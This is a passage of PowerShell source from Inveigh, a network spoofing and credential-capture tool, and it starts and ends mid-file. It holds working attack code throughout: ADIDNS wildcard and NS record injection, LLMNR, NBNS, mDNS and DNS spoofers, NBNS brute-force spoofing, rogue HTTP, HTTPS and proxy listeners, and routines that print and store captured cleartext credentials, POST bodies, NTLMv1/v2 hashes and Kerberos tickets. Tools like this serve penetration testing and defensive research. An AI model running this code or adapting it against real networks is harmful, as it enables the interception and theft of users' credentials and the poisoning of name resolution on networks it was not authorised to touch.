                $certificate_store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My","LocalMachine")
                $certificate_store.Open('ReadWrite')
                $certificates = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Issuer -Like "CN=" + $inveigh.certificate_issuer})

                foreach($certificate in $certificates)
                {
                    $certificate_store.Remove($certificate)
                }

                $certificate_store.Close()
            }
            catch
            {
                $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] SSL Certificate Deletion Error [Remove Manually]") > $null
            }

        }

        if($ADIDNSCleanup -eq 'Y' -and $inveigh.ADIDNS_table.Count -gt 0)
        {
            [Array]$ADIDNS_table_keys_temp = $inveigh.ADIDNS_table.Keys

            foreach($ADIDNS_host in $ADIDNS_table_keys_temp)
            {
                
                if($inveigh.ADIDNS_table.$ADIDNS_host -ge 1)
                {

                    try
                    {
                        Disable-ADIDNSNode -Credential $ADIDNSCredential -Domain $ADIDNSDomain -DomainController $ADIDNSDomainController -Node $ADIDNS_host -Partition $ADIDNSPartition -Zone $ADIDNSZone
                        $inveigh.ADIDNS_table.$ADIDNS_host = $null
                    }
                    catch
                    {
                        $error_message = $_.Exception.Message
                        $error_message = $error_message -replace "`n",""
                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
                        $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] ADIDNS host record for $ADIDNS_host remove failed") > $null
                    }

                }

            }

        }
        
        if($inveigh.relay_running)
        {
            Start-Sleep -m 100

            if($Message)
            {
                $inveigh.output_queue.Add("[*] [$(Get-Date -format s)] Inveigh Relay is exiting due to $Message") > $null
            }
            else
            {
                $inveigh.output_queue.Add("[*] [$(Get-Date -format s)] Inveigh Relay is exiting") > $null  
            }

            if(!$inveigh.running)
            {
                Invoke-OutputQueueLoop
                Start-Sleep -m 100
            }

            $inveigh.relay_running = $false
        }

        if($inveigh.running)
        {

            if($Message)
            {
                $inveigh.output_queue.Add("[*] [$(Get-Date -format s)] Inveigh is exiting due to $Message") > $null
            }
            else
            {
                $inveigh.output_queue.Add("[*] [$(Get-Date -format s)] Inveigh is exiting") > $null  
            }

            Invoke-OutputQueueLoop

            if(!$elevated_privilege)
            {
                Start-Sleep -s 3
            }

            $inveigh.running = $false
        }

        $inveigh.ADIDNS = $null
        $inveigh.HTTPS = $false
    }

    if($inveigh.ADIDNS -contains 'Wildcard')
    {
        Invoke-ADIDNSSpoofer -Credential $ADIDNSCredential -Data $SpooferIP -Domain $ADIDNSDomain -DomainController $ADIDNSDomainController -Forest $ADIDNSForest -Node '*' -Partition $ADIDNSPartition -Type 'A'-TTL $ADIDNSTTL -Zone $ADIDNSZone
    }

    if($inveigh.ADIDNS -contains 'NS')
    {

        if($ADIDNSNSTarget.EndsWith($ADIDNSZone))
        {
            $NS_data = $ADIDNSNSTarget
            $ADIDNSNSTarget = $ADIDNSNSTarget -replace ".$ADIDNSZone",''
        }
        else
        {
            $NS_data = $ADIDNSNSTarget + "." + $ADIDNSZone
        }

        Invoke-ADIDNSSpoofer -Credential $ADIDNSCredential -Data $SpooferIP -Domain $ADIDNSDomain -DomainController $ADIDNSDomainController -Forest $ADIDNSForest -Node $ADIDNSNSTarget -Partition $ADIDNSPartition -Type 'A' -TTL $ADIDNSTTL -Zone $ADIDNSZone
        Invoke-ADIDNSSpoofer -Credential $ADIDNSCredential -Data $NS_data -Domain $ADIDNSDomain -DomainController $ADIDNSDomainController -Forest $ADIDNSForest -Node $ADIDNSNS -Partition $ADIDNSPartition -Type 'NS' -TTL $ADIDNSTTL -Zone $ADIDNSZone
    }

    if($NBNSBruteForcePause)
    {   
        $NBNS_pause = New-TimeSpan -Seconds $NBNSBruteForcePause
    }

    $run_count_NTLMv1 = $RunCount + $inveigh.NTLMv1_list.Count
    $run_count_NTLMv2 = $RunCount + $inveigh.NTLMv2_list.Count
    $run_count_cleartext = $RunCount + $inveigh.cleartext_list.Count

    if($RunTime)
    {    
        $control_timeout = New-TimeSpan -Minutes $RunTime
        $control_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
    }

    while($inveigh.running)
    {

        if($NBNSBruteForcePause -and $inveigh.hostname_spoof)
        {
         
            if($inveigh.NBNS_stopwatch.Elapsed -ge $NBNS_pause)
            {
                $inveigh.hostname_spoof = $false
            }
        
        }

        if($RunCount)
        {
            
            if($inveigh.NTLMv1_list.Count -ge $run_count_NTLMv1 -or $inveigh.NTLMv2_list.Count -ge $run_count_NTLMv2 -or $inveigh.cleartext_list.Count -ge $run_count_cleartext)
            {
                Stop-InveighRunspace "reaching run count"           
            }

        }

        if($RunTime)
        {

            if($control_stopwatch.Elapsed -ge $control_timeout)
            {
                Stop-InveighRunspace "reaching run time"
            }

        }

        if($inveigh.ADIDNS -contains 'Combo' -and $inveigh.request_table_updated)
        {
            
            try
            {
                Invoke-ADIDNSCheck -Credential $ADIDNSCredential -Data $SpooferIP -Domain $ADIDNSDomain -DomainController $ADIDNSDomainController -Forest $ADIDNSForest -Ignore $ADIDNSHostsIgnore -Partition $ADIDNSPartition -RequestTable $inveigh.request_table -Threshold $ADIDNSThreshold -TTL $ADIDNSTTL -Zone $ADIDNSZone
            }
            catch
            {
                $error_message = $_.Exception.Message
                $error_message = $error_message -replace "`n",""
                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
            }

            $inveigh.request_table_updated = $false
        }

        if($inveigh.ADIDNS -and $inveigh.ADIDNS_table.Count -gt 0)
        {
            [Array]$ADIDNS_table_keys_temp = $inveigh.ADIDNS_table.Keys

            foreach($ADIDNS_host in $ADIDNS_table_keys_temp)
            {
                
                if($inveigh.ADIDNS_table.$ADIDNS_host -eq 1)
                {

                    try
                    {
                        Grant-ADIDNSPermission -Credential $ADIDNSCredential -Domain $ADIDNSDomain -DomainController $ADIDNSDomainController -Node $ADIDNS_host -Principal 'Authenticated Users'-Zone $ADIDNSZone
                        $inveigh.ADIDNS_table.$ADIDNS_host = 2
                    }
                    catch
                    {
                        $error_message = $_.Exception.Message
                        $error_message = $error_message -replace "`n",""
                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] ADIDNS ACE add for host record for $ADIDNS_host failed") > $null
                    }

                }

            }

        }

        if($inveigh.file_output)
        {

            while($inveigh.log_file_queue.Count -gt 0)
            {
                $inveigh.log_file_queue[0]|Out-File $inveigh.log_out_file -Append
                $inveigh.log_file_queue.RemoveAt(0)
            }

            while($inveigh.NTLMv1_file_queue.Count -gt 0)
            {
                $inveigh.NTLMv1_file_queue[0]|Out-File $inveigh.NTLMv1_out_file -Append
                $inveigh.NTLMv1_file_queue.RemoveAt(0)
            }

            while($inveigh.NTLMv2_file_queue.Count -gt 0)
            {
                $inveigh.NTLMv2_file_queue[0]|Out-File $inveigh.NTLMv2_out_file -Append
                $inveigh.NTLMv2_file_queue.RemoveAt(0)
            }

            while($inveigh.cleartext_file_queue.Count -gt 0)
            {
                $inveigh.cleartext_file_queue[0]|Out-File $inveigh.cleartext_out_file -Append
                $inveigh.cleartext_file_queue.RemoveAt(0)
            }

            while($inveigh.POST_request_file_queue.Count -gt 0)
            {
                $inveigh.POST_request_file_queue[0]|Out-File $inveigh.POST_request_out_file -Append
                $inveigh.POST_request_file_queue.RemoveAt(0)
            }

        }

        if(!$inveigh.console_output -and $ConsoleQueueLimit -ge 0)
        {

            while($inveigh.console_queue.Count -gt $ConsoleQueueLimit -and !$inveigh.console_output)
            {
                $inveigh.console_queue.RemoveAt(0)
            }

        }

        if(!$inveigh.status_output)
        {
            Invoke-OutputQueueLoop
        }

        Start-Sleep -m 5
        
        if($inveigh.stop)
        {
            $inveigh.console_queue.Clear()
            Stop-InveighRunspace
        }

    }

}

#endregion
#region begin startup functions

# HTTP Listener Startup Function 
function HTTPListener
{
    $proxy_listener = $false
    $HTTPS_listener = $false
    $HTTP_runspace = [RunspaceFactory]::CreateRunspace()
    $HTTP_runspace.Open()
    $HTTP_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)
    $HTTP_powershell = [PowerShell]::Create()
    $HTTP_powershell.Runspace = $HTTP_runspace
    $HTTP_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $HTTP_powershell.AddScript($NTLM_functions_scriptblock) > $null
    $HTTP_powershell.AddScript($kerberos_functions_scriptblock) > $null
    $HTTP_powershell.AddScript($HTTP_scriptblock).AddArgument($Challenge).AddArgument($Kerberos).AddArgument(
        $KerberosCount).AddArgument($KerberosCredential).AddArgument($KerberosHash).AddArgument(
        $KerberosHostHeader).AddArgument($HTTPAuth).AddArgument($HTTPBasicRealm).AddArgument(
        $HTTPContentType).AddArgument($HTTPIP).AddArgument($HTTPPort).AddArgument(
        $HTTPDefaultEXE).AddArgument($HTTPDefaultFile).AddArgument($HTTPDirectory).AddArgument(
        $HTTPResponse).AddArgument($HTTPS_listener).AddArgument($IP).AddArgument($NBNSBruteForcePause).AddArgument(
        $output_directory).AddArgument($Proxy).AddArgument($ProxyIgnore).AddArgument($proxy_listener).AddArgument(
        $WPADAuth).AddArgument($WPADAuthIgnore).AddArgument($WPADResponse) > $null
    $HTTP_powershell.BeginInvoke() > $null
}

Start-Sleep -m 50

# HTTPS Listener Startup Function 
function HTTPSListener
{
    $proxy_listener = $false
    $HTTPS_listener = $true
    $HTTPS_runspace = [RunspaceFactory]::CreateRunspace()
    $HTTPS_runspace.Open()
    $HTTPS_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)
    $HTTPS_powershell = [PowerShell]::Create()
    $HTTPS_powershell.Runspace = $HTTPS_runspace
    $HTTPS_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $HTTPS_powershell.AddScript($NTLM_functions_scriptblock) > $null
    $HTTPS_powershell.AddScript($kerberos_functions_scriptblock) > $null
    $HTTPS_powershell.AddScript($HTTP_scriptblock).AddArgument($Challenge).AddArgument($Kerberos).AddArgument(
        $KerberosCount).AddArgument($KerberosCredential).AddArgument($KerberosHash).AddArgument(
        $KerberosHostHeader).AddArgument($HTTPAuth).AddArgument($HTTPBasicRealm).AddArgument(
        $HTTPContentType).AddArgument($HTTPIP).AddArgument($HTTPSPort).AddArgument(
        $HTTPDefaultEXE).AddArgument($HTTPDefaultFile).AddArgument($HTTPDirectory).AddArgument(
        $HTTPResponse).AddArgument($HTTPS_listener).AddArgument($IP).AddArgument($NBNSBruteForcePause).AddArgument(
        $output_directory).AddArgument($Proxy).AddArgument($ProxyIgnore).AddArgument($proxy_listener).AddArgument(
        $WPADAuth).AddArgument($WPADAuthIgnore).AddArgument($WPADResponse) > $null
    $HTTPS_powershell.BeginInvoke() > $null
}

Start-Sleep -m 50

# Proxy Listener Startup Function 
function ProxyListener
{
    $proxy_listener = $true
    $HTTPS_listener = $false
    $proxy_runspace = [RunspaceFactory]::CreateRunspace()
    $proxy_runspace.Open()
    $proxy_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)
    $proxy_powershell = [PowerShell]::Create()
    $proxy_powershell.Runspace = $proxy_runspace
    $proxy_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $proxy_powershell.AddScript($NTLM_functions_scriptblock) > $null
    $proxy_powershell.AddScript($kerberos_functions_scriptblock) > $null
    $proxy_powershell.AddScript($HTTP_scriptblock).AddArgument($Challenge).AddArgument($Kerberos).AddArgument(
        $KerberosCount).AddArgument($KerberosCredential).AddArgument($KerberosHash).AddArgument(
        $KerberosHostHeader).AddArgument($HTTPAuth).AddArgument($HTTPBasicRealm).AddArgument(
        $HTTPContentType).AddArgument($ProxyIP).AddArgument($ProxyPort).AddArgument(
        $HTTPDefaultEXE).AddArgument($HTTPDefaultFile).AddArgument($HTTPDirectory).AddArgument(
        $HTTPResponse).AddArgument($HTTPS_listener).AddArgument($IP).AddArgument($NBNSBruteForcePause).AddArgument(
        $output_directory).AddArgument($Proxy).AddArgument($ProxyIgnore).AddArgument($proxy_listener).AddArgument(
        $WPADAuth).AddArgument($WPADAuthIgnore).AddArgument($WPADResponse) > $null
    $proxy_powershell.BeginInvoke() > $null
}

# Sniffer/Spoofer Startup Function
function SnifferSpoofer
{
    $sniffer_runspace = [RunspaceFactory]::CreateRunspace()
    $sniffer_runspace.Open()
    $sniffer_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)
    $sniffer_powershell = [PowerShell]::Create()
    $sniffer_powershell.Runspace = $sniffer_runspace
    $sniffer_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $sniffer_powershell.AddScript($NTLM_functions_scriptblock) > $null
    $sniffer_powershell.AddScript($kerberos_functions_scriptblock) > $null
    $sniffer_powershell.AddScript($SMB_functions_scriptblock) > $null
    $sniffer_powershell.AddScript($sniffer_scriptblock).AddArgument($DNS).AddArgument($DNSTTL).AddArgument(
        $EvadeRG).AddArgument($Inspect).AddArgument($IP).AddArgument($Kerberos).AddArgument($KerberosCount).AddArgument(
        $KerberosCredential).AddArgument($KerberosHash).AddArgument($LLMNR).AddArgument(
        $LLMNRTTL).AddArgument($mDNS).AddArgument($mDNSTypes).AddArgument($mDNSTTL).AddArgument($NBNS).AddArgument(
        $NBNSTTL).AddArgument($NBNSTypes).AddArgument($output_directory).AddArgument($Pcap).AddArgument(
        $PcapTCP).AddArgument($PcapUDP).AddArgument($SMB).AddArgument($SpooferHostsIgnore).AddArgument(
        $SpooferHostsReply).AddArgument($SpooferIP).AddArgument($SpooferIPsIgnore).AddArgument(
        $SpooferIPsReply).AddArgument($SpooferLearning).AddArgument($SpooferLearningDelay).AddArgument(
        $SpooferLearningInterval).AddArgument($SpooferNonprintable).AddArgument(
        $SpooferThresholdHost).AddArgument($SpooferThresholdNetwork) > $null
    $sniffer_powershell.BeginInvoke() > $null
}

# Unprivileged DNS Spoofer Startup Function
function DNSSpoofer
{
    $DNS_spoofer_runspace = [RunspaceFactory]::CreateRunspace()
    $DNS_spoofer_runspace.Open()
    $DNS_spoofer_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)
    $DNS_spoofer_powershell = [PowerShell]::Create()
    $DNS_spoofer_powershell.Runspace = $DNS_spoofer_runspace
    $DNS_spoofer_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $DNS_spoofer_powershell.AddScript($DNS_spoofer_scriptblock).AddArgument($Inspect).AddArgument(
        $DNSTTL).AddArgument($SpooferIP) > $null
    $DNS_spoofer_powershell.BeginInvoke() > $null
}

# Unprivileged LLMNR Spoofer Startup Function
function LLMNRSpoofer
{
    $LLMNR_spoofer_runspace = [RunspaceFactory]::CreateRunspace()
    $LLMNR_spoofer_runspace.Open()
    $LLMNR_spoofer_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)
    $LLMNR_spoofer_powershell = [PowerShell]::Create()
    $LLMNR_spoofer_powershell.Runspace = $LLMNR_spoofer_runspace
    $LLMNR_spoofer_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $LLMNR_spoofer_powershell.AddScript($LLMNR_spoofer_scriptblock).AddArgument($Inspect).AddArgument(
        $LLMNRTTL).AddArgument($SpooferIP).AddArgument($SpooferHostsReply).AddArgument(
        $SpooferHostsIgnore).AddArgument($SpooferIPsReply).AddArgument(
        $SpooferIPsIgnore).AddArgument($SpooferNonprintable) > $null
    $LLMNR_spoofer_powershell.BeginInvoke() > $null
}

# Unprivileged mDNS Spoofer Startup Function
function mDNSSpoofer
{
    $mDNS_spoofer_runspace = [RunspaceFactory]::CreateRunspace()
    $mDNS_spoofer_runspace.Open()
    $mDNS_spoofer_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)
    $mDNS_spoofer_powershell = [PowerShell]::Create()
    $mDNS_spoofer_powershell.Runspace = $mDNS_spoofer_runspace
    $mDNS_spoofer_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $mDNS_spoofer_powershell.AddScript($mDNS_spoofer_scriptblock).AddArgument($Inspect).AddArgument(
        $mDNSTTL).AddArgument($mDNSTypes).AddArgument($SpooferIP).AddArgument($SpooferHostsReply).AddArgument(
        $SpooferHostsIgnore).AddArgument($SpooferIPsReply).AddArgument($SpooferIPsIgnore) > $null
    $mDNS_spoofer_powershell.BeginInvoke() > $null
}

# Unprivileged NBNS Spoofer Startup Function
function NBNSSpoofer
{
    $NBNS_spoofer_runspace = [RunspaceFactory]::CreateRunspace()
    $NBNS_spoofer_runspace.Open()
    $NBNS_spoofer_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)
    $NBNS_spoofer_powershell = [PowerShell]::Create()
    $NBNS_spoofer_powershell.Runspace = $NBNS_spoofer_runspace
    $NBNS_spoofer_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $NBNS_spoofer_powershell.AddScript($NBNS_spoofer_scriptblock).AddArgument($Inspect).AddArgument(
        $IP).AddArgument($NBNSTTL).AddArgument($NBNSTypes).AddArgument($SpooferIP).AddArgument(
        $SpooferHostsIgnore).AddArgument($SpooferHostsReply).AddArgument($SpooferIPsIgnore).AddArgument(
        $SpooferIPsReply).AddArgument($SpooferNonprintable) > $null
    $NBNS_spoofer_powershell.BeginInvoke() > $null
}

# NBNS Brute Force Spoofer Startup Function
function NBNSBruteForceSpoofer
{
    $NBNS_bruteforce_spoofer_runspace = [RunspaceFactory]::CreateRunspace()
    $NBNS_bruteforce_spoofer_runspace.Open()
    $NBNS_bruteforce_spoofer_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)
    $NBNS_bruteforce_spoofer_powershell = [PowerShell]::Create()
    $NBNS_bruteforce_spoofer_powershell.Runspace = $NBNS_bruteforce_spoofer_runspace
    $NBNS_bruteforce_spoofer_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $NBNS_bruteforce_spoofer_powershell.AddScript($NBNS_bruteforce_spoofer_scriptblock).AddArgument(
    $NBNSBruteForceHost).AddArgument($NBNSBruteForcePause).AddArgument($NBNSBruteForceTarget).AddArgument(
    $NBNSTTL).AddArgument($SpooferIP) > $null
    $NBNS_bruteforce_spoofer_powershell.BeginInvoke() > $null
}

# Control Loop Startup Function
function ControlLoop
{
    $control_runspace = [RunspaceFactory]::CreateRunspace()
    $control_runspace.Open()
    $control_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)
    $control_powershell = [PowerShell]::Create()
    $control_powershell.Runspace = $control_runspace
    $control_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $control_powershell.AddScript($ADIDNS_functions_scriptblock) > $null
    $control_powershell.AddScript($control_scriptblock).AddArgument($ADIDNSACE).AddArgument(
        $ADIDNSCleanup).AddArgument($ADIDNSCredential).AddArgument($ADIDNSDomain).AddArgument(
        $ADIDNSDomainController).AddArgument($ADIDNSForest).AddArgument($ADIDNSHostsIgnore).AddArgument(
        $ADIDNSNS).AddArgument($ADIDNSNSTarget).AddArgument($ADIDNSPartition).AddArgument(
        $ADIDNSThreshold).AddArgument($ADIDNSTTL).AddArgument($ADIDNSZone).AddArgument(
        $ConsoleQueueLimit).AddArgument($elevated_privilege).AddArgument($NBNSBruteForcePause).AddArgument(
        $RunCount).AddArgument($RunTime).AddArgument($SpooferIP) > $null
    $control_powershell.BeginInvoke() > $null
}

#endregion
#region begin startup enabled services

# HTTP Server Start
if($HTTP -eq 'Y')
{
    HTTPListener
}

# HTTPS Server Start
if($HTTPS -eq 'Y')
{
    HTTPSListener
}

# Proxy Server Start
if($Proxy -eq 'Y')
{
    ProxyListener
}

# Sniffer/Spoofer Start
if(($DNS -eq 'Y' -or $LLMNR -eq 'Y' -or $mDNS -eq 'Y' -or $NBNS -eq 'Y' -or $SMB -eq 'Y' -or $Inspect) -and $elevated_privilege)
{ 
    SnifferSpoofer
}
elseif(($DNS -eq 'Y' -or $LLMNR -eq 'Y' -or $mDNS -eq 'Y' -or $NBNS -eq 'Y' -or $SMB -eq 'Y') -and !$elevated_privilege)
{

    if($DNS -eq 'Y')
    {
        DNSSpoofer
    }

    if($LLMNR -eq 'Y')
    {
        LLMNRSpoofer
    }

    if($mDNS -eq 'Y')
    {
        mDNSSpoofer
    }

    if($NBNS -eq 'Y')
    {
        NBNSSpoofer
    }

    if($NBNSBruteForce -eq 'Y')
    {
        NBNSBruteForceSpoofer
    }

}

# NBNSBruteForce Spoofer Start
if($NBNSBruteForce -eq 'Y')
{
    NBNSBruteForceSpoofer
}

# Control Loop Start
ControlLoop

# Console Output Loop
try
{

    if($ConsoleOutput -ne 'N')
    {

        if($ConsoleStatus)
        {    
            $console_status_timeout = New-TimeSpan -Minutes $ConsoleStatus
            $console_status_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
        }

        :console_loop while(($inveigh.running -and $inveigh.console_output) -or ($inveigh.console_queue.Count -gt 0 -and $inveigh.console_output))
        {
    
            while($inveigh.console_queue.Count -gt 0)
            {

                switch -wildcard ($inveigh.console_queue[0])
                {

                    {$_ -like "?`[`!`]*" -or $_ -like "?`[-`]*"}
                    {

                        if($inveigh.output_stream_only)
                        {
                            Write-Output($inveigh.console_queue[0] + $inveigh.newline)
                        }
                        else
                        {
                            Write-Warning($inveigh.console_queue[0])
                        }

                        $inveigh.console_queue.RemoveAt(0)
                    }

                    {$_ -like "* spoofer disabled" -or $_ -like "* local request" -or $_ -like "* host header *" -or $_ -like "* user agent received *"}
                    {

                        if($ConsoleOutput -eq 'Y')
                        {

                            if($inveigh.output_stream_only)
                            {
                                Write-Output($inveigh.console_queue[0] + $inveigh.newline)
                            }
                            else
                            {
                                Write-Output($inveigh.console_queue[0])
                            }

                        }

                        $inveigh.console_queue.RemoveAt(0)
                    } 

                    {$_ -like "*response sent]" -or $_ -like "*ignoring*" -or $_ -like "* HTTP*request for *" -or $_ -like "* Proxy*request for *" -or $_ -like "*SYN packet*"}
                    {
                    
                        if($ConsoleOutput -ne "Low")
                        {

                            if($inveigh.output_stream_only)
                            {
                                Write-Output($inveigh.console_queue[0] + $inveigh.newline)
                            }
                            else
                            {
                                Write-Output($inveigh.console_queue[0])
                            }

                        }

                        $inveigh.console_queue.RemoveAt(0)
                    } 

                    default
                    {

                        if($inveigh.output_stream_only)
                        {
                            Write-Output($inveigh.console_queue[0] + $inveigh.newline)
                        }
                        else
                        {
                            Write-Output($inveigh.console_queue[0])
                        }

                        $inveigh.console_queue.RemoveAt(0)
                    }

                }

            }

            if($ConsoleStatus -and $console_status_stopwatch.Elapsed -ge $console_status_timeout)
            {
            
                if($inveigh.cleartext_list.Count -gt 0)
                {
                    Write-Output("[*] [$(Get-Date -format s)] Current unique cleartext captures:" + $inveigh.newline)
                    $inveigh.cleartext_list.Sort()
                    $cleartext_list_temp = $inveigh.cleartext_list

                    foreach($unique_cleartext in $cleartext_list_temp)
                    {

                        if($unique_cleartext -ne $unique_cleartext_last)
                        {
                            Write-Output($unique_cleartext + $inveigh.newline)
                        }

                        $unique_cleartext_last = $unique_cleartext
                    }

                    Start-Sleep -m 5
                }
                else
                {
                    Write-Output("[+] [$(Get-Date -format s)] No cleartext credentials have been captured" + $inveigh.newline)
                }

                if($inveigh.POST_request_list.Count -gt 0)
                {
                    Write-Output("[*] [$(Get-Date -format s)] Current unique POST request captures:" + $inveigh.newline)
                    $inveigh.POST_request_list.Sort()
                    $POST_request_list_temp = $inveigh.POST_request_list

                    foreach($unique_POST_request in $POST_request_list_temp)
                    {

                        if($unique_POST_request -ne $unique_POST_request_last)
                        {
                            Write-Output($unique_POST_request + $inveigh.newline)
                        }

                        $unique_POST_request_last = $unique_POST_request
                    }

                    Start-Sleep -m 5
                }
            
                if($inveigh.NTLMv1_list.Count -gt 0)
                {
                    Write-Output("[*] [$(Get-Date -format s)] Current unique NTLMv1 challenge/response captures:" + $inveigh.newline)
                    $inveigh.NTLMv1_list.Sort()
                    $NTLMv1_list_temp = $inveigh.NTLMv1_list

                    foreach($unique_NTLMv1 in $NTLMv1_list_temp)
                    {
                        $unique_NTLMv1_account = $unique_NTLMv1.SubString(0,$unique_NTLMv1.IndexOf(":",($unique_NTLMv1.IndexOf(":") + 2)))

                        if($unique_NTLMv1_account -ne $unique_NTLMv1_account_last)
                        {
                            Write-Output($unique_NTLMv1 + $inveigh.newline)
                        }

                        $unique_NTLMv1_account_last = $unique_NTLMv1_account
                    }

                    $unique_NTLMv1_account_last = ''
                    Start-Sleep -m 5
                    Write-Output("[*] [$(Get-Date -format s)] Current NTLMv1 IP addresses and usernames:" + $inveigh.newline)
                    $NTLMv1_username_list_temp = $inveigh.NTLMv1_username_list

                    foreach($NTLMv1_username in $NTLMv1_username_list_temp)
                    {
                        Write-Output($NTLMv1_username + $inveigh.newline)
                    }

                    Start-Sleep -m 5
                }
                else
                {
                    Write-Output("[+] [$(Get-Date -format s)] No NTLMv1 challenge/response hashes have been captured" + $inveigh.newline)
                }

                if($inveigh.NTLMv2_list.Count -gt 0)
                {
                    Write-Output("[*] [$(Get-Date -format s)] Current unique NTLMv2 challenge/response captures:" + $inveigh.newline)
                    $inveigh.NTLMv2_list.Sort()
                    $NTLMv2_list_temp = $inveigh.NTLMv2_list

                    foreach($unique_NTLMv2 in $NTLMv2_list_temp)
                    {
                        $unique_NTLMv2_account = $unique_NTLMv2.SubString(0,$unique_NTLMv2.IndexOf(":",($unique_NTLMv2.IndexOf(":") + 2)))

                        if($unique_NTLMv2_account -ne $unique_NTLMv2_account_last)
                        {
                            Write-Output($unique_NTLMv2 + $inveigh.newline)
                        }

                        $unique_NTLMv2_account_last = $unique_NTLMv2_account
                    }

                    $unique_NTLMv2_account_last = ''
                    Start-Sleep -m 5
                    Write-Output("[*] [$(Get-Date -format s)] Current NTLMv2 IP addresses and usernames:" + $inveigh.newline)
                    $NTLMv2_username_list_temp = $inveigh.NTLMv2_username_list

                    foreach($NTLMv2_username in $NTLMv2_username_list_temp)
                    {
                        Write-Output($NTLMv2_username + $inveigh.newline)
                    }
                
                }
                else
                {
                    Write-Output("[+] [$(Get-Date -format s)] No NTLMv2 challenge/response hashes have been captured" + $inveigh.newline)
                }

                $console_status_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
            }

            if($inveigh.console_input)
            {

                if([Console]::KeyAvailable)
                {
                    $inveigh.console_output = $false
                    BREAK console_loop
                }
        
            }

            Start-Sleep -m 5
        }

    }

}
finally
{

    if($Tool -eq 2)
    {
        $inveigh.running = $false
    }

}

}
#endregion
#region begin support functions
function Stop-Inveigh
{
<#
.SYNOPSIS
Stop-Inveigh will stop all running Inveigh functions.
#>

    if($inveigh)
    {
        $inveigh.stop = $true
        
        if($inveigh.running -or $inveigh.relay_running)
        {
            $inveigh.console_queue.Clear()
            Watch-Inveigh -NoConsoleMessage
        }
        else
        {
            Write-Output "[-] There are no running Inveigh functions"
        }

    }

}

function Get-Inveigh
{
<#
.SYNOPSIS
Get-Inveigh will get stored Inveigh data from memory.

.PARAMETER Console
Get queued console output. This is also the default if no parameters are set.

.PARAMETER ADIDNS
Get added DNS host records.

.PARAMETER ADIDNSFailed
Get failed DNS host record adds.

.PARAMETER Cleartext
Get captured cleartext credentials.

.PARAMETER CleartextUnique
Get unique captured cleartext credentials.

.PARAMETER KerberosUsername
Get IP addresses, usernames, and index for captured Kerberos TGTs.

.PARAMETER KerberosTGT
Get Kerberos TGT kirbi byte array by index.

.PARAMETER Learning
Get valid hosts discovered through spoofer learning.

.PARAMETER Log
Get log entries.

.PARAMETER NTLMv1
Get captured NTLMv1 challenge/response hashes.

.PARAMETER NTLMv1Unique
Get the first captured NTLMv1 challenge/response for each unique account.

.PARAMETER NTLMv1Usernames
Get IP addresses and usernames for captured NTLMv1 challenge/response hashes.

.PARAMETER NTLMv2
Get captured NTLMv1 challenge/response hashes.

.PARAMETER NTLMv2Unique
Get the first captured NTLMv2 challenge/response for each unique account.

.PARAMETER NTLMv2Usernames
Get IP addresses and usernames for captured NTLMv2 challenge/response hashes.

.PARAMETER POSTRequest
Get captured POST requests.

.PARAMETER POSTRequestUnique
Get unique captured POST request.

.PARAMETER Session
Get relay session list.
#>

    [CmdletBinding()]
    param
    ( 
        [parameter(Mandatory=$false)][Switch]$Cleartext,
        [parameter(Mandatory=$false)][Switch]$CleartextUnique,
        [parameter(Mandatory=$false)][Switch]$Console,
        [parameter(Mandatory=$false)][Switch]$ADIDNS,
        [parameter(Mandatory=$false)][Switch]$ADIDNSFailed,
        [parameter(Mandatory=$false)][Int]$KerberosTGT,
        [parameter(Mandatory=$false)][Switch]$KerberosUsername,
        [parameter(Mandatory=$false)][Switch]$Learning,
        [parameter(Mandatory=$false)][Switch]$Log,
        [parameter(Mandatory=$false)][Switch]$NTLMv1,
        [parameter(Mandatory=$false)][Switch]$NTLMv2,
        [parameter(Mandatory=$false)][Switch]$NTLMv1Unique,
        [parameter(Mandatory=$false)][Switch]$NTLMv2Unique,
        [parameter(Mandatory=$false)][Switch]$NTLMv1Usernames,
        [parameter(Mandatory=$false)][Switch]$NTLMv2Usernames,
        [parameter(Mandatory=$false)][Switch]$POSTRequest,
        [parameter(Mandatory=$false)][Switch]$POSTRequestUnique,
        [parameter(Mandatory=$false)][Switch]$Session,
        [parameter(Mandatory=$false)][Switch]$Enumerate,
        [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
    )

    if($Console -or $PSBoundParameters.Count -eq 0)
    {

        while($inveigh.console_queue.Count -gt 0)
        {

            if($inveigh.output_stream_only)
            {
                Write-Output($inveigh.console_queue[0] + $inveigh.newline)
                $inveigh.console_queue.RemoveAt(0)
            }
            else
            {

                switch -wildcard ($inveigh.console_queue[0])
                {

                    {$_ -like "?`[`!`]*" -or $_ -like "?`[-`]*"}
                    {
                        Write-Warning $inveigh.console_queue[0]
                        $inveigh.console_queue.RemoveAt(0)
                    }

                    default
                    {
